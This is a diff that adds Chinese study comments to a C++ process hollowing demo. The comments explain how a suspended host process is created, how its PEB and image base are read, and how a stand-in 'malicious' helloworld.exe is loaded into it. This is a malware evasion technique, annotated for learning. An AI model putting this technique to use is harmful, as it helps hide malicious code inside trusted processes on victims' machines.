@@ -5,15 +5,14 @@
 #include "internals.h"
 #include "pe.h"
 
-void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
+void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)	//创建 scvhost.exe无害进程
 {
-
+	// 创建进程
 	printf("Creating process\r\n");
-
-	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
-	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
+	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();	//用于指定新进程的主窗口特性的一个结构。
+	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();	//该结构返回有关新进程及其主线程的信息。
 	
-	CreateProcessA
+	CreateProcessA	// process state is suspened
 	(
 		0,
 		pDestCmdLine,		
@@ -27,18 +26,22 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 		pProcessInfo
 	);
 
-	if (!pProcessInfo->hProcess)
+	if (!pProcessInfo->hProcess)	//PROCESS_INFORMATION结构里的hProcess(主线程句柄)
 	{
 		printf("Error creating process\r\n");
 
 		return;
 	}
+	
+	/********************************************************************************************/
+	// 这个demo的做法是在PE.h里构建了PEB的类结构, 其实没那么麻烦, 看https://github.com/kernelm0de/RunPE-ProcessHollowing/blob/master/main.cpp的实现
 
+	// 获取hprocess句柄对应的process的PEB结构, PEB结构里有指向process的内存空间基址的成员指针.
 	PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
-
-	PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);
-
+	// 读取内存, image = 内存空间, 比难懂的 `镜像` 好理解
+	PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);	//pPEB->ImageBaseAddress, 指向process的内存空间基址(基地址, 就和PE头文件里的ImageBase一样)
 	printf("Opening source image\r\n");
+
 
 	HANDLE hFile = CreateFileA
 	(
@@ -288,10 +291,12 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 
 int _tmain(int argc, _TCHAR* argv[])
 {
+	// 找到目标文件
 	char* pPath = new char[MAX_PATH];
-	GetModuleFileNameA(0, pPath, MAX_PATH);
-	pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
-	strcat(pPath, "helloworld.exe");
+	GetModuleFileNameA(0, pPath, MAX_PATH);	//获得当前进程的路径名称
+	//strrchr() finds the last occurrence of '\\' in pPath. 返回该字符以及其后面的字符.
+	pPath[strrchr(pPath, '\\') - pPath + 1] = 0;	//只留下所在的文件夹的路径, 去掉进程名.
+	strcat(pPath, "helloworld.exe");	//完成拼接, 得到同目录下的"helloworld.exe"的路径名. 这里这个文件扮演的是恶意程序
 	
 	CreateHollowedProcess
 	(
